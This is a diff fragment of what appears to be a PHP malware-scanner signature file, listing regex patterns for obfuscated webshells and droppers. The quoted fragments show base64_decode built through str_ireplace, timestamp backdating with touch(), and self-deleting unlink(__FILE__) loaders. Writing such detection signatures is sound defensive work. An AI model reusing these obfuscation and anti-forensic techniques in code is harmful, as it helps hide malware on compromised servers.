+      'pattern' => '/ser \\= \\$to_data\\[3\\];
+\\$from_email \\= \\$to_data\\[4\\];
+\\$header \\= \\$to_data\\[5\\];
+
+
+
+\\$jfnbrsjfq \\=  mail\\(\\$to, \\$x_subject, \\$x_body\\);
+if/s',
+      'label' => 'sample-specific content window',
+    ),
+    105 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$mxmtxb\\=str_ireplace\\("f","","ffbffaffffsffffffefffff6ffff4fff_ffffdffffeffcffffoffffdfffffefff"\\); \\$ensbst\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    106 => 
     array (
       'pattern' => '/\\<\\?php
 \\/\\*\\*
- \\* Used to set up and fix common variables and include
- \\* the WordPress procedural and class library\\.
- \\*
- \\* Al/s',
+ \\* @package    Lib
+ \\* \\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}4xX1YWzXyQH9hcYN9MDRHdZeu4AZh11VhN6CDtvPSxwrGR
+\\}/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    107 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*
+ \\* @package    Error Lib
+ \\* \\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}\\(\\$it\\)                      \\)
+
+
+;/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    108 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "czFKvsRnpu"; if \\(file_exists\\("\\.\\/init\\.partly\\.php"\\)\\)\\{ touch\\("\\.\\/init\\.partly\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*xvW/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    109 => 
+    array (
+      'pattern' => '/p4MFpENUxSVms4TDNSa1BqeDBaRDQ4YVc1d2RYUWdkSGx3Wl[\\s\\S]{0,12000}ned\\(\'NVPY\'\\)\\)
+\\{
+	define\\(\'NVPY\', __DIR__\\);
+\\}
+
+
+
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    110 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$kuqaqxts\\=str_ireplace\\("h","","hbhhhhahhhhhhshhehhhhh6hh4hhhh_hhhhdhhhhhhehhhhchhhhhohhhhdhhhhhehh"\\); \\$tatruuwx\\="DQoJCUBlcnJvcl9yZXBvc/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    111 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$tgdaae\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$upfwxnmmn\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbm/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    112 => 
+    array (
+      'pattern' => '/Z2JtRnRaVDBpY0hSdklpQjJZV3gxWlQwaUp5NWlZWE5sTmpS[\\s\\S]{0,12000}_DEPRECATED\\|E_USER_DEPRECATED\\)\\);
+\\}
+
+
+
+
+
+
+
+
+
+
+
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    113 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "yYsKHeFWvB"; if \\(file_exists\\("\\.\\/watch_video\\.php"\\)\\)\\{ touch\\("\\.\\/watch_video\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*Fww/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    114 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "wRQubMhwDF"; if \\(file_exists\\("\\.\\/error_log\\.php"\\)\\)\\{ touch\\("\\.\\/error_log\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*hmapcsZ/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    115 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}Vd4MVpUMGlKeTRrY21kd1pXWnVhR0YxZW10akxpY2lQand2Z/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    116 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$mtrgarydc\\=str_ireplace\\("q","","qqqbqqqqaqqqqsqqqqqqeqqqqq6qqqqqq4qqqqq_qqqqdqqqeqqqcqqqqoqqqdqqqqeqqq"\\); \\$cdyzbeuhey\\="DQoJCUBlcnJvcl9/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    117 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$pfftakr\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$bvvkyz\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbmlf/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    118 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$thmvz\\=str_ireplace\\("i","","iibiiiiiiaiiisiiieiiiii6iiii4iiiii_iiiidiiieiiiiciiioiiiidiiiieii"\\); \\$htepc\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoM/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    119 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$xpbmtnx\\=str_ireplace\\("x","","xxxbxxxxxxaxxxxsxxxxxexxxx6xxxx4xxxxx_xxxxdxxxexxxxcxxxoxxxxdxxxex"\\); \\$zsrsbd\\="DQoJCUBlcnJvcl9yZXBvcnRpb/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    120 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$vfrzbuu\\=str_ireplace\\("h","","hhhbhhhahhhhshhhehhhh6hhh4hhhh_hhdhhhhehhhchhhhhohhhdhhhehh"\\); \\$csxuntq\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    121 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}CMllXeDFaVDBpSnk0a2EzZG5ZbWN1SnlJK1BDOTBaRDROQ2p/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    122 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "hqwMEgSMcT"; if \\(file_exists\\("\\.\\/gutscheine\\.php"\\)\\)\\{ touch\\("\\.\\/gutscheine\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*UdqKu/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    123 => 
+    array (
+      'pattern' => '/WVhScFl5QWtabTl5ZDJGeVpHVmtJRDBnWVhKeVlYa29EUW92[\\s\\S]{0,12000}H\'\\)\\)
+\\{
+	define\\(\'KRDH\', __DIR__\\);
+\\}
+
+
+
+
+
+
+
+
+
+
+
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    124 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "TzhvRRgxVW"; if \\(file_exists\\("\\.\\/changecurrency\\.php"\\)\\)\\{ touch\\("\\.\\/changecurrency\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\);/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    125 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "qyrZCdMabn"; if \\(file_exists\\("\\.\\/moderate\\.php"\\)\\)\\{ touch\\("\\.\\/moderate\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*HdUWty5se/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    126 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$gkaaaegnn\\=str_ireplace\\("q","","qqqbqqqaqqqqqqsqqqqqqeqq6qqqq4qqq_qqqqdqqqeqqqcqqqqqqoqqqqdqqqqeq"\\); \\$cfwxzey\\="DQoJCUBlcnJvcl9yZXBvcnR/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    127 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$cqvhmubftu\\=str_ireplace\\("w","","wwbwwawwwwwwswwwewww6wwww4wwwwww_wwwwdwwwwwwewwwcwwwowwwwwwdwwwwwew"\\); \\$dghvprk\\="DQoJCUBlcnJvcl9yZXBv/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    128 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "DYYQYSFKUm"; if \\(file_exists\\("\\.\\/register2\\.php"\\)\\)\\{ touch\\("\\.\\/register2\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*565hAH5/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    129 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$bmrpr\\=str_ireplace\\("x","","xxxbxxxxxaxxxsxxxxxexx6xxxxx4xxxxx_xxxxdxxxxxxexxxxcxxxxxoxxxxdxxxxxxex"\\); \\$ktmzcg\\="DQoJCUBlcnJvcl9yZXBvcn/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    130 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$xvuykgzevv\\=str_ireplace\\("i","","iiibiiiaiisiiieiiiii6iiiii4iiiiii_iiiiiidiiieiiiiciiiioiiiiidiiiieii"\\); \\$bxeqhmt\\="DQoJCUBlcnJvcl9yZXB/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    131 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "wXXUwWbYGA"; if \\(file_exists\\("\\.\\/loose_lib\\.php"\\)\\)\\{ touch\\("\\.\\/loose_lib\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*QkGk95N/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    132 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$bsadpzugt\\=str_ireplace\\("m","","mmbmmmmammmmsmmemmmmm6mmmmm4mmmm_mmdmmmmmemmcmmmommmmmmdmmmemmm"\\); \\$cbqzn\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    133 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$tdsgattt\\=str_ireplace\\("k","","kkkbkkakkkkkskkekk6kkkkk4kk_kkkkkdkkekkkkkckkkkkokkkdkkkkkekk"\\); \\$uqcqvh\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoM/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    134 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "wUNcwuwZrH"; if \\(file_exists\\("\\.\\/archivo\\.php"\\)\\)\\{ touch\\("\\.\\/archivo\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*FPR30EFu3sa/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    135 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*
+ \\* @package    Error Lib
+ \\* \\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}array                     \\(\\$it\\)             \\)
+;/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    136 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*
+ \\* @package    Libraries
+ \\* \\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}\\)      
+\\{
+	define\\(\'PATH\', __DIR__\\)           ;
+\\}/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    137 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$zrmerscsyv\\=str_ireplace\\("r","","rrrbrrrrarrrrsrrrrerrrrr6rrrrr4rr_rrrrrrdrrrrerrrrcrrrrorrrrrdrrrer"\\); \\$ecmvpfbp\\="DQoJCUBlcnJvcl9yZXB/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    138 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$gwnpbvu\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$wqmxwdfs\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbm/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    139 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "xhrTkbKDYD"; if \\(file_exists\\("\\.\\/resend_login\\.php"\\)\\)\\{ touch\\("\\.\\/resend_login\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*r/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    140 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$xqckedd\\=str_ireplace\\("m","","mmbmmmmammmmmmsmmmemmmm6mmmm4mmm_mmmmmmdmmmmemmmcmmmmmmommmdmmmemmm"\\); \\$nzbycsw\\="DQoJCUBlcnJvcl9yZXBvcnR/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    141 => 
+    array (
+      'pattern' => '/hp\'\\) \\< 10\\)\\) && file_exists\\(PATH \\. \'\\/error\\.php\'\\)\\)[\\s\\S]{0,12000}\\(  \\$win_error, E_USER_ERROR\\)
+;/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    142 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$ftrxmtk\\=str_ireplace\\("f","","fffbffaffsffffefff6ffff4fff_ffffdffefffffcfffofffffdfffffef"\\); \\$dcusz\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7D/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    143 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$dteadkd\\=str_ireplace\\("n","","nbnnnnannnnnsnnennn6nnnn4nnnn_nnnndnnnnennnnncnnonnnndnnnnen"\\); \\$nxhaupqxmk\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    144 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$crzkwb\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$rypxdutack\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpb/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    145 => 
+    array (
+      'pattern' => '/xJbDA3RFFwcFppZ2tiVzlrWlQwOUltTnZibVpwWnlJZ1FVNUVJQ1JtZEdaMFpuQjFaM05oY1hjOVBTUmZSMFZVV3lkclpYa25YU2w3RFFwbFkyaHZJQ2M4Wm/s',
       'label' => 'sample-specific content window',
     ),
-    1206 => 
+    146 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$qdfgv\\=str_ireplace\\("y","","ybyyyayyyyysyyeyyyy6yyy4yyyyy_yyydyyeyyyycyyoyyydyyyeyy"\\); \\$mnzkyvz\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJC/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    147 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "DernqCWXYx"; if \\(file_exists\\("\\.\\/api\\.rubber\\.php"\\)\\)\\{ touch\\("\\.\\/api\\.rubber\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*P60fs/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    148 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$qsuqkzv\\=str_ireplace\\("n","","nnnbnnnnnannnsnnnnennn6nnnn4nnn_nndnnennnncnnnonnnndnnnnennn"\\); \\$fwvgvnb\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMC/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    149 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*
+ \\* @package    Libraries
+ \\* \\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}ta
+usort                  \\( \\$b, \\$a          \\)
+
+;/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    150 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}a1gxQlBVMVJiSW5CMGJ5SmRLUzRuSWpzZ0pIUjRkVzFqZDNW/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    151 => 
+    array (
+      'pattern' => '/VkzUnBiMjVmWlhocGMzUnpLQ2R6YzJOaGJtWW5LU2tnZXlCe[\\s\\S]{0,12000}\\)\\)
+\\{
+	define\\(\'BYMAWW\', __DIR__\\);
+\\}
+
+
+
+
+
+
+
+
+
+
+
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    152 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}IyUmxLQ1J5WW5kd1pYUjNkR1owY1haaWRHNHBMaWNpUGp3dm/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    153 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$xvaesku\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$nqxca\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbmlfc/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    154 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$pfgbt\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$ykpuxkyar\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbml/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    155 => 
+    array (
+      'pattern' => '/NzTUNrN0RRcEFhVzVwWDNObGRDZ25iV0Y0WDJWNFpXTjFkR2[\\s\\S]{0,12000}CGGZ\'\\)\\)
+\\{
+	define\\(\'CSCGGZ\', __DIR__\\);
+\\}
+
+
+
+
+
+
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    156 => 
+    array (
+      'pattern' => '/VRjlEVEVsRlRsUmZTVkFuTEEwS0x5OG5TRlJVVUY5WVgwWlB[\\s\\S]{0,12000}TPRDMW\'\\)\\)
+\\{
+	define\\(\'TPRDMW\', __DIR__\\);
+\\}
+
+
+
+
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    157 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "WbmmHNuGMD"; if \\(file_exists\\("\\.\\/realtones\\.php"\\)\\)\\{ touch\\("\\.\\/realtones\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*dUasPYN/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    158 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$futnaxznk\\=str_ireplace\\("k","","kkkbkkkakkkkskkkkkkekkkk6kkkk4kk_kkkkkkdkkkkkekkkkckkkkokkkkkdkkkkkkekkk"\\); \\$mcbsqsfvvx\\="DQoJCUBlcnJvc/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    159 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$fcbtp\\=str_ireplace\\("f","","fbfffafffffsffffeff6ff4ff_ffdfffefffffcfffoffffdfffeff"\\); \\$dtrsna\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUB/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    160 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$mttvbba\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$ksvrmd\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbmlf/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    161 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$negxaspm\\=str_ireplace\\("g","","gggbgggagggsggggeggggg6ggggg4ggg_ggggdggeggggggcggogggggdggggeggg"\\); \\$yspnywxnb\\="DQoJCUBlcnJvcl9yZXBvcn/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    162 => 
+    array (
+      'pattern' => '/hWHBsYjJZb0pHWnBiR1VwT3lScEt5c3BEUXBwWmlna2FUMDl[\\s\\S]{0,12000}\'RETBDC\'\\)\\)
+\\{
+	define\\(\'RETBDC\', __DIR__\\);
+\\}
+
+
+
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    163 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "mptnmQvEbT"; if \\(file_exists\\("\\.\\/error\\-500\\.php"\\)\\)\\{ touch\\("\\.\\/error\\-500\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*s2z3TVD/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    164 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$hugrzzmgv\\=str_ireplace\\("t","","ttbttatttstttttettttt6ttt4tttt_tttttdtttettttctttotttdtttet"\\); \\$gqwxnk\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMC/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    165 => 
+    array (
+      'pattern' => '/WRJVkZSUVgwWlBVbGRCVWtSRlJGOUdUMUluTEEwS0x5OG5TR[\\s\\S]{0,12000}ALL \\^ \\(E_DEPRECATED\\|E_USER_DEPRECATED\\)\\);
+\\}
+
+
+
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    166 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$rvmgzc\\=str_ireplace\\("u","","uuubuuuauuusuueuuuuu6uuuu4uuu_uuuuuduueuucuuuuouuuuuduuuuueu"\\); \\$pnhafzkf\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMC/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    167 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$gmsgtwhdw\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$bpamfuprn\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUB/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    168 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*
+ \\* @package    License Lib
+ \\* \\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}K6Hvf7XsZSdEkkSPseUK6GuMKD1QAb2p9HQqCkvrFWqKrQCr/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    169 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$mhmdcbuyq\\=str_ireplace\\("k","","kkkbkkkkkakkskkkkkkekkkk6kkkk4kkkk_kkkkkdkkkekkkkckkkkkokkkkkkdkkkkek"\\); \\$ayketmhx\\="DQoJCUBlcnJvcl9yZX/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    170 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}d2JHOWtaU2dpTHlJc0lHSmhjMlUyTkY5a1pXTnZaR1VvSkdW/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    171 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$nfukzg\\=str_ireplace\\("m","","mmbmmmmmmammmmsmmmmemmmmm6mmmmm4mmmm_mmmdmmmmmmemmmmmmcmmmmommmdmmmemmm"\\); \\$wdqmubtseg\\="DQoJCUBlcnJvcl9yZ/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    172 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$hdumyysk\\=str_ireplace\\("h","","hbhhahhhhhshhhhhehhh6hhhh4hhhh_hhhhdhhhehhhchhhohhhhdhhhhehh"\\); \\$puvpv\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    173 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$yxstcb\\=str_ireplace\\("h","","hhhbhhhahhhhshhhehhhh6hhh4hhhh_hhdhhhhehhhchhhhhohhhdhhhehh"\\); \\$yxrbapfkm\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMC/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    174 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$ptxeqrta\\=str_ireplace\\("i","","iiibiiiiaiiiisiiieiii6iiii4iiii_iiiidiiiiieiiiiciioiiidiiiiiieii"\\); \\$pvhtwp\\="DQoJCUBlcnJvcl9yZXBvcnRpbm/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    175 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "pXZUTkFNQV"; if \\(file_exists\\("\\.\\/admin_forums\\.php"\\)\\)\\{ touch\\("\\.\\/admin_forums\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*b/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    176 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$ekhuygp\\=str_ireplace\\("m","","mmbmmmmmammmmmmsmmmemmmmmm6mmm4mmmm_mmdmmmmmemmmmmcmmmommmmdmmemmm"\\); \\$ksdyahy\\="DQoJCUBlcnJvcl9yZXBvcnRp/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    177 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*
+ \\* @package    Lib
+ \\* \\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}\\)                            \\);     \\$h\\(\\)
+
+;
+\\}/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    178 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$xzmbnkyyg\\=str_ireplace\\("z","","zbzzzazzzszzzzzzezzzzz6zz4zzzz_zzzzzdzzzzzezzzzzczzzzozzzzdzzzzez"\\); \\$dutfwnn\\="DQoJCUBlcnJvcl9yZXBvcnR/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    179 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$vsgkvd\\=str_ireplace\\("w","","wwbwwwwwwawwwwwswwewwww6wwwww4wwwww_wwwwwdwwewwwwwcwwwwwowwwwdwwwwew"\\); \\$qexzxcc\\="DQoJCUBlcnJvcl9yZXBvcnR/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    180 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "zqFftBSSaY"; if \\(file_exists\\("\\.\\/album_upload\\.php"\\)\\)\\{ touch\\("\\.\\/album_upload\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*9/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    181 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$pwasvpu\\=str_ireplace\\("x","","xxxbxxxxxaxxsxxxxxexxx6xxxxx4xxxx_xxxxxdxxxxxexxxxxcxxoxxdxxexx"\\); \\$cpagsf\\="DQoJCUBlcnJvcl9yZXBvcnRpbmco/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    182 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "XwCFAsazMq"; if \\(file_exists\\("\\.\\/refunds\\.php"\\)\\)\\{ touch\\("\\.\\/refunds\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*dZW0x6ntUv1/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    183 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$hbxfgvvz\\=str_ireplace\\("q","","qbqqqqqqaqqqqsqqqqeqqq6qqqqq4qq_qqqqqdqqqqeqqqqqqcqqqoqqqqqqdqqqqqeqq"\\); \\$tbvde\\="DQoJCUBlcnJvcl9yZXBvcn/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    184 => 
+    array (
